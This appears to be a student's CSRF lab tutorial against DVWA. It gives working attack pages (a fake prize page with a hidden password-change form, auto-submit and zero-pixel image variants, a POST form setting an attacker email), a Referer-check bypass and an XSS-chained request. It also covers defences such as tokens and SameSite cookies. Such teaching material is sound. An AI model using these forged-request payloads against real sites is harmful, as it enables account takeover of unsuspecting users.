# Day 14 — Cross-Site Request Forgery (CSRF)
### ApexPlanet Internship | Task 3: Web Application Security
**Timeline:** Days 25–36 | **Author:** Professorshubhx

---

## What is CSRF

Cross-Site Request Forgery (CSRF) tricks a logged-in user into unknowingly submitting a request to a web application they are already authenticated to. The application receives the request, sees a valid session cookie, and executes the action — without knowing the user didn't intend to do it.

The key difference between CSRF and XSS:
- XSS exploits the user's trust in the website
- CSRF exploits the website's trust in the user's browser

If you are logged into your bank and you visit a malicious page, that page can silently submit a form to your bank's transfer endpoint — using your active session — and transfer money without you doing anything.

---

## How CSRF Works

```
1. User logs into bank.com → gets session cookie
   Cookie: session=abc123 (stored in browser)

2. User visits evil.com (attacker's page)

3. evil.com has a hidden form that auto-submits to bank.com/transfer
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker_account">
     <input name="amount" value="50000">
   </form>
   <script>document.forms[0].submit()</script>

4. Browser sends the request to bank.com
   AND automatically includes the session cookie (browser behavior)

5. bank.com sees valid session → executes transfer
   User never knew it happened
```

The browser automatically attaches cookies to every request going to a domain — regardless of where the request originated. CSRF exploits this behavior.

---

## 1. CSRF Attack on DVWA — Password Change

### Setup

```
DVWA → CSRF
Security level: Low
Make sure you are logged in as admin
```

The CSRF page in DVWA is a password change form. It asks for a new password and confirm password — no current password required. This is a bad design that makes it very easy to demonstrate CSRF.

### Step 1 — Understand the Legitimate Request

First, change the password normally through the form. Intercept in Burp Suite.

The request looks like:

```
GET /dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change HTTP/1.1
Host: 192.168.56.104
Cookie: PHPSESSID=abc123xyz; security=low
```

Key observations:
- It's a GET request (terrible for state-changing actions)
- No CSRF token anywhere
- Just needs a valid session cookie — which the browser sends automatically

### Step 2 — Build the Attack Page

Create an HTML file on Kali that automatically submits this request:

```bash
nano /var/www/html/csrf-attack.html
```

Paste this content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Win a Prize!</title>
</head>
<body>

<h1>Congratulations! You won a prize!</h1>
<p>Click the button below to claim your reward.</p>
<button onclick="document.forms[0].submit()">Claim Prize</button>

<!-- Hidden form that actually changes the DVWA password -->
<form action="http://192.168.56.104/dvwa/vulnerabilities/csrf/" method="GET" style="display:none">
    <input type="hidden" name="password_new" value="hacked123">
    <input type="hidden" name="password_conf" value="hacked123">
    <input type="hidden" name="Change" value="Change">
</form>

</body>
</html>
```

### Step 3 — Serve the Attack Page

```bash
# Start Apache on Kali
sudo service apache2 start

# Or use Python
python3 -m http.server 80 --directory /var/www/html
```

### Step 4 — Trigger the Attack

While still logged into DVWA as admin, open a new tab and visit:

```
http://192.168.56.100/csrf-attack.html
```

Click "Claim Prize."

The form submits to DVWA using your active session. DVWA changes the admin password to `hacked123`.

Try logging out and logging back in with `password` — it fails. Try `hacked123` — it works. Password changed via CSRF.

### Step 5 — Auto-Submit Version (No Click Required)

Even more dangerous — make it submit automatically without any user interaction:

```html
<!DOCTYPE html>
<html>
<body>

<!-- Auto-submits as soon as page loads — victim just needs to visit -->
<form id="csrf-form" action="http://192.168.56.104/dvwa/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="hacked123">
    <input type="hidden" name="password_conf" value="hacked123">
    <input type="hidden" name="Change" value="Change">
</form>

<script>
    document.getElementById('csrf-form').submit();
</script>

</body>
</html>
```

Now just visiting the page is enough — no click needed. The attacker would embed this in an email link, a forum post, or an ad.

---

## 2. CSRF via Image Tag

For GET-based actions, even an `<img>` tag works:

```html
<!-- Visitor's browser makes a GET request to this URL automatically -->
<img src="http://192.168.56.104/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
```

The browser tries to load the "image" — which is actually the CSRF URL. The password gets changed. The user sees nothing — the image is 0x0 pixels.

This is why GET requests should never be used for state-changing actions.

---

## 3. POST-Based CSRF

Most modern applications use POST for state-changing requests. POST-based CSRF still works — you just need a form:

```html
<form id="csrf" action="http://target.com/change-email" method="POST">
    <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit()</script>
```

POST CSRF is slightly harder because:
- Some servers check the `Referer` header (weak protection)
- SameSite cookies may block cross-site POST requests
- But without a proper CSRF token — it still works

---

## 4. DVWA Medium Security — Referer Check Bypass

On Medium security, DVWA checks the HTTP `Referer` header — it only accepts the request if the Referer contains the target hostname.

```php
// DVWA Medium check
if( stripos( $_SERVER[ 'HTTP_REFERER' ], $_SERVER[ 'SERVER_NAME' ] ) !== false ) {
    // Process request
}
```

Bypass: name your attack file to include the server name:

```
Host your attack page at a path that contains "192.168.56.104":
http://192.168.56.100/192.168.56.104/csrf-attack.html
```

The Referer header will be:
```
Referer: http://192.168.56.100/192.168.56.104/csrf-attack.html
```

`stripos` finds `192.168.56.104` in the Referer — check passes — attack succeeds.

This shows why Referer-based protection is unreliable.

---

## 5. CSRF + XSS Combination

If the target site has XSS, CSRF becomes even more dangerous because the malicious request originates from the same origin — bypassing same-site restrictions.

```javascript
// XSS payload that also performs CSRF
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change', true);
xhr.withCredentials = true;
xhr.send();
</script>
```

This is why XSS vulnerabilities are rated higher than standalone CSRF — XSS can chain into CSRF.

---

## 6. Prevention — CSRF Tokens

The standard defense against CSRF is a **synchronizer token** — a random unpredictable value embedded in every form that the server validates on submission.

### How Token Protection Works

```
1. User requests the password change page
2. Server generates a random token: csrf_token = "x7Kp9mN2qR8vL3jT"
3. Server stores token in session AND embeds it in the form:
   <input type="hidden" name="csrf_token" value="x7Kp9mN2qR8vL3jT">
4. User submits the form — token is included in the request
5. Server checks: does the submitted token match the session token?
6. If yes → process request
   If no → reject request (CSRF attack blocked)
```

The attacker's page cannot know the token because:
- It's different for every session
- It's only accessible to JavaScript on the same origin
- The attacker can't read the victim's page due to Same-Origin Policy

### Implementing CSRF Tokens in PHP

```php
// On the form page — generate and store token
session_start();

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$token = $_SESSION['csrf_token'];
```

```html
<!-- Embed token in form -->
<form action="/change-password" method="POST">
    <input type="hidden" name="csrf_token" value="<?php echo $token; ?>">
    <input type="password" name="new_password" placeholder="New Password">
    <button type="submit">Change Password</button>
</form>
```

```php
// On the form handler — validate token
session_start();

if (!isset($_POST['csrf_token']) ||
    !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF token validation failed");
}

// Token is valid — process the request
```

`hash_equals()` is used instead of `==` to prevent timing attacks.

### DVWA High Security — Token Implementation

Look at DVWA's High security source code:

```php
// DVWA generates a token
$token = md5(uniqid());
$_SESSION['session_token'] = $token;

// And checks it on submission
if( isset( $_SESSION['session_token'] ) && isset( $_GET['user_token'] ) ) {
    if( $_SESSION['session_token'] == $_GET['user_token'] ) {
        // Valid — change password
    }
}
```

This is what proper CSRF protection looks like. The attacker's page cannot get the `user_token` value — so the forged request is rejected.

---

## 7. Additional CSRF Defenses

### SameSite Cookie Attribute

Modern browsers support the `SameSite` cookie attribute which controls when cookies are sent cross-site:

```php
setcookie("session", $session_id, [
    'samesite' => 'Strict',   // Cookie never sent cross-site
    'httponly' => true,
    'secure'   => true
]);
```

```
SameSite=Strict    Cookie only sent when navigating from same site
                   Strongest protection — breaks some legitimate cross-site flows

SameSite=Lax       Cookie sent for top-level navigations (clicking links)
                   Not sent for cross-site POST, img, iframe requests
                   Good balance — now the browser default in most browsers

SameSite=None      Cookie sent in all contexts — requires Secure flag
                   Used for legitimate cross-site scenarios (embedded content)
```

SameSite=Lax is now the default in Chrome, Firefox, and Edge — this has significantly reduced CSRF attacks in the wild.

### Double Submit Cookie

An alternative to server-side token storage:

```
1. Generate a random value
2. Set it as a cookie AND include it in the form as a hidden field
3. On submission: verify the cookie value matches the form field value
4. Attacker can't read the cookie (SameSite/HttpOnly) so can't forge a matching value
```

### Custom Request Header

APIs often use this approach:

```javascript
// Set a custom header on AJAX requests
fetch('/api/change-password', {
    method: 'POST',
    headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ password: 'new' })
});
```

Cross-site requests cannot set custom headers — so the server just needs to verify the header exists.

---

## Practice Tasks

1. Go to DVWA CSRF on Low — use Burp Suite to intercept the legitimate password change request — note the URL structure
2. Create `csrf-attack.html` on Kali with the hidden form — serve it with Python HTTP server
3. While logged into DVWA, visit your attack page and click the button — confirm password changes
4. Create the auto-submit version — visit the page and confirm password changes without clicking
5. Try the `<img>` tag CSRF — embed it in an HTML page and confirm it works
6. Set DVWA to Medium — try the standard attack — confirm it fails
7. Try the Referer bypass on Medium — host attack page at a path containing the target IP — confirm it works
8. Set DVWA to High — try the standard attack — confirm it's blocked (token validation)
9. Read DVWA High source code — identify where the token is generated and validated
10. Implement CSRF token in a simple PHP form — test that a forged request without the token is rejected

---

## Quick Reference

```
CSRF ATTACK TYPES               HOW IT WORKS
GET-based CSRF                  Browser auto-sends cookies cross-site
  <img src="target/action?x=1"> Session cookie included automatically
POST-based CSRF                 Server sees valid session → executes
  Hidden form + auto-submit     User has no idea it happened
Image tag (0x0 pixel)

PROTECTIONS                     WHY REFERER FAILS
CSRF Token (synchronizer)       Referer can be spoofed
SameSite cookie (Strict/Lax)    Referer can be manipulated via path
Double submit cookie            Referer may be stripped by proxies
Custom request header           Not reliable — don't use alone
Verify origin header

CSRF vs XSS
CSRF  Exploits website's trust in user's browser
XSS   Exploits user's trust in the website
CSRF + XSS together = CSRF bypasses same-origin restriction
```

---

## Resources

- OWASP CSRF Guide: https://owasp.org/www-community/attacks/csrf
- OWASP CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger CSRF Labs: https://portswigger.net/web-security/csrf
- SameSite Cookie Explained: https://web.dev/samesite-cookies-explained/
- Defronix Academy | Mentor: Nitesh Singh Sir

---

## Connect

- **LinkedIn:** [Shubham Chaurasiya](https://www.linkedin.com/in/shubham-chaurasiya-60932a359/)
- **TryHackMe:** [professorshubhx](https://tryhackme.com/p/professorshubhx)

---

*Day 14 Complete | Next: Day 15 — File Inclusion (LFI and RFI) — Read sensitive files, execute remote code*
